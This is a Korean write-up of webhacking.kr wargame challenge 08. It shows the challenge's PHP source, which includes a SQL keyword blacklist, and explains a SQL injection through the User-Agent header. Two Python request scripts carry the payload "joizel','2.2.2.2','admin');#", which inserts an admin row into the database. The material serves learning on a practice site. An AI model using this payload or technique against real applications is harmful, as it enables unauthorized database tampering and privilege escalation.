================================================================================================================
[webhacking.kr] 08
================================================================================================================

|

.. graphviz::

    digraph G {
        rankdir="LR";
        node[shape="point"];
        edge[arrowhead="none"]

        {
            rank="same";
            "client"[shape="plaintext"];
            "client" -> step0 -> step2 -> step4;
        }

        {
            rank="same";
            "server"[shape="plaintext"];
            "server" -> step1 -> step3 -> step5;
        }
        step0 -> step1[label="User-Agent: joizel','2.2.2.2','admin');#",arrowhead="normal"];
        step3 -> step2[label="insert into lv0(agent,ip,id) values('joizel','2.2.2.2','admin');#','$ip','guest')",arrowhead="normal"];
    }

|


소스 분석
================================================================================================================

- GET 파라미터: HTTP_USER_AGENT
- String
- insert

.. code-block:: php

    <html>
    <body>
    <?
    $agent=getenv("HTTP_USER_AGENT");
    $ip=$_SERVER[REMOTE_ADDR];
    $agent=trim($agent);
    $agent=str_replace(".","_",$agent);
    $agent=str_replace("/","_",$agent);
    $pat="/\/|\*|union|char|ascii|select|out|infor|schema|columns|sub|-|\+|\||!|update|del|drop|from|where|order|by|asc|desc|lv|board|\([0-9]|sys|pass|\.|like|and|\'\'|sub/";
    $agent=strtolower($agent);
    if(preg_match($pat,$agent)) 
        exit("Access Denied!");
    $_SERVER[HTTP_USER_AGENT]=str_replace("'","",$_SERVER[HTTP_USER_AGENT]);
    $_SERVER[HTTP_USER_AGENT]=str_replace("\"","",$_SERVER[HTTP_USER_AGENT]);
    $count_ck=@mysql_fetch_array(mysql_query("select count(id) from lv0"));
    if($count_ck[0]>=70) { 
        @mysql_query("delete from lv0"); 
    }
    $q=@mysql_query("select id from lv0 where agent='$_SERVER[HTTP_USER_AGENT]'");
    $ck=@mysql_fetch_array($q);
    if($ck){ 
        echo("hi <b>$ck[0]</b><p>");
        if($ck[0]=="admin"){
            @solve();
            @mysql_query("delete from lv0");
        }
    }
    if(!$ck){
        $q=@mysql_query("insert into lv0(agent,ip,id) values('$agent','$ip','guest')") or die("query error");
        echo("<br><br>done!  ($count_ck[0]/70)");
    }
    ?>
    </body>
    </html>


User-Agent 변조
================================================================================================================

입력 부분이 getenv("HTTP_USER_AGENT")이고, User-Agent를 변조해서 admin이라는 계정을 삽입할 수 있다.

.. code-block:: sql

    insert into lv0(agent,ip,id) values('$agent','$ip','guest')

해당 소스 코드를 통해 agent값을 변조하여 쿼리를 날린다.

.. code-block:: python

    import requests

    url = "http://webhacking.kr/challenge/web/web-08/index.php"
    headers = {
        "User-Agent":"joizel','2.2.2.2','admin');#"
    }
    cookies = {
        "PHPSESSID":"9johqp6c81c5hf11lkomnghhn6"
    }
    r = requests.get(url, headers = headers, cookies=cookies, verify=False)

    print r.content

등록한 agent를 이용해 쿼리를 날리면 패스워드를 확인할 수 있다.

.. code-block:: sql

    select id from lv0 where agent='$_SERVER[HTTP_USER_AGENT]'

.. code-block:: python

    import requests

    url = "http://webhacking.kr/challenge/web/web-08/index.php"
    headers = {
        "User-Agent":"joizel"
    }
    cookies = {
        "PHPSESSID":"9johqp6c81c5hf11lkomnghhn6"
    }
    r = requests.get(url, headers = headers, cookies=cookies, verify=False)

    print r.content

